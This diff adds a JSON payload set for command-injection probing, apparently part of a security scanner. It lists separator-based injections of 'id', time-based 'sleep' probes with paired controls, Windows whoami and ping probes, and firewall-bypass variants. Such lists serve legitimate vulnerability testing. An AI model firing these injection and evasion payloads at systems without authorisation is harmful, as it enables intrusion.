@@ -1,0 +1,46 @@
+{
+  "name": "cmdi",
+  "说明": "命令注入探针。时间盲注配对最重要：sleep 0 与 sleep 3 对照，避免网络抖动误判。",
+  "sets": {
+    "separators": [
+      ";id",
+      "|id",
+      "||id",
+      "&id",
+      "&&id",
+      "`id`",
+      "$(id)",
+      "%0aid",
+      "\nid"
+    ],
+    "time": [
+      ";sleep 0",
+      ";sleep 3",
+      "|sleep 3",
+      "& sleep 3",
+      "$(sleep 3)",
+      "`sleep 3`"
+    ],
+    "windows": [
+      "& whoami",
+      "| whoami",
+      "; ping -n 3 127.0.0.1",
+      "& ping -n 3 127.0.0.1"
+    ],
+    "waf_bypass": [
+      ";i''d",
+      ";i\\d",
+      "%3bid",
+      "$IFS$9id",
+      ";{id}",
+      ";/bin/i''d"
+    ]
+  },
+  "pairs": {
+    "time": [
+      [";sleep 0", ";sleep 3"],
+      ["|sleep 0", "|sleep 3"],
+      ["$(sleep 0)", "$(sleep 3)"]
+    ]
+  }
+}
